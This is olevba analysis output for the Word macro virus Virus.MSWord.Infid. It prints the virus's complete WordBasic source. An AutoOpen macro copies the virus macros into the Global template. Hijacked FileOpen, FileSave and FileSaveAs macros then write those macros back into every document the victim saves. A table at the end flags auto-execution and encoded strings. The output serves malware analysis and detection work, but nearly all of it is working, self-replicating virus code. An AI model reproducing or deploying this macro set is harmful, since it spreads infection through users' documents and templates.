olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Infid-5eab0425a60d30a9ee97d182faebead4b542f6c4
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO MsWord 
in file: Virus.MSWord.Infid-5eab0425a60d30a9ee97d182faebead4b542f6c4 - OLE stream: 'MsWord'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
WordBasic.MsgBox "Microsoft Word", "MS WORD", 48
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen 
in file: Virus.MSWord.Infid-5eab0425a60d30a9ee97d182faebead4b542f6c4 - OLE stream: 'AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim FN$
Dim ID
Dim I
FN$ = WordBasic.[FileNameInfo$](WordBasic.[FileName$](), 4)
ID = 0
For I = 1 To WordBasic.CountMacros(0)
    If UCase(WordBasic.[MacroName$](I, 0)) = "MSWORD" Then ID = 1
Next I
If ID = 0 Then
WordBasic.MacroCopy FN$ + ":FileOpen", "Global:FileOpen"
WordBasic.MacroCopy FN$ + ":FileSave", "Global:FileSave"
WordBasic.MacroCopy FN$ + ":FileSaveAs", "Global:FileSaveAs"
WordBasic.MacroCopy FN$ + ":AutoOpen", "Global:AutoOpen"
WordBasic.MacroCopy FN$ + ":MsWord", "Global:MSWord"
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileOpen 
in file: Virus.MSWord.Infid-5eab0425a60d30a9ee97d182faebead4b542f6c4 - OLE stream: 'FileOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Opens an existing document or template"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileOpen.MAIN"
Dim FN$
On Error GoTo -1: On Error GoTo Abort
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
Dim inf As Object: Set inf = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileOpen dlg
WordBasic.Dialog.FileOpen dlg
WordBasic.FileOpen dlg
FN$ = WordBasic.[FileName$]()
WordBasic.CurValues.FileSaveAs inf
inf.Name = FN$
inf.Format = 1
WordBasic.FileSaveAs inf
Abort:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSave 
in file: Virus.MSWord.Infid-5eab0425a60d30a9ee97d182faebead4b542f6c4 - OLE stream: 'FileSave'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves the active document or template"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSave.MAIN"
Dim FN$
Dim ID
Dim I
On Error GoTo -1: On Error GoTo Abort
Dim inf As Object: Set inf = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.FileSave
FN$ = WordBasic.[FileNameInfo$](WordBasic.[FileName$](), 4)
WordBasic.CurValues.FileSaveAs inf
inf.Name = WordBasic.[FileName$]()
inf.Format = 1
WordBasic.FileSaveAs inf
ID = 0
For I = 1 To WordBasic.CountMacros(1)
    If UCase(WordBasic.[MacroName$](I, 1)) = "MSWORD" Then ID = 1
Next I
If ID = 0 Then
WordBasic.MacroCopy "Global:FileOpen", FN$ + ":FileOpen"
WordBasic.MacroCopy "Global:FileSave", FN$ + ":FileSave"
WordBasic.MacroCopy "Global:FileSaveAs", FN$ + ":FileSaveAs"
WordBasic.MacroCopy "Global:AutoOpen", FN$ + ":AutoOpen"
WordBasic.MacroCopy "Global:MSWord", FN$ + ":MsWord"
WordBasic.FileSaveAs inf
End If
Abort:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSaveAs 
in file: Virus.MSWord.Infid-5eab0425a60d30a9ee97d182faebead4b542f6c4 - OLE stream: 'FileSaveAs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves a copy of the document in a separate file"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSaveAs.MAIN"
Dim FN$
Dim ID
Dim I
On Error GoTo -1: On Error GoTo Abort
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
dlg.Format = 1
WordBasic.FileSaveAs dlg
FN$ = WordBasic.[FileNameInfo$](WordBasic.[FileName$](), 4)
ID = 0
For I = 1 To WordBasic.CountMacros(1)
    If UCase(WordBasic.[MacroName$](I, 1)) = "MSWORD" Then ID = 1
Next I
If ID = 0 Then
WordBasic.MacroCopy "Global:FileOpen", FN$ + ":FileOpen"
WordBasic.MacroCopy "Global:FileSave", FN$ + ":FileSave"
WordBasic.MacroCopy "Global:FileSaveAs", FN$ + ":FileSaveAs"
WordBasic.MacroCopy "Global:AutoOpen", FN$ + ":AutoOpen"
WordBasic.MacroCopy "Global:MSWord", FN$ + ":MsWord"
WordBasic.FileSaveAs dlg
End If
Abort:
End Sub
-------------------------------------------------------------------------------
VBA MACRO ThisDocument 
in file: Virus.MSWord.Infid-5eab0425a60d30a9ee97d182faebead4b542f6c4 - OLE stream: 'ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

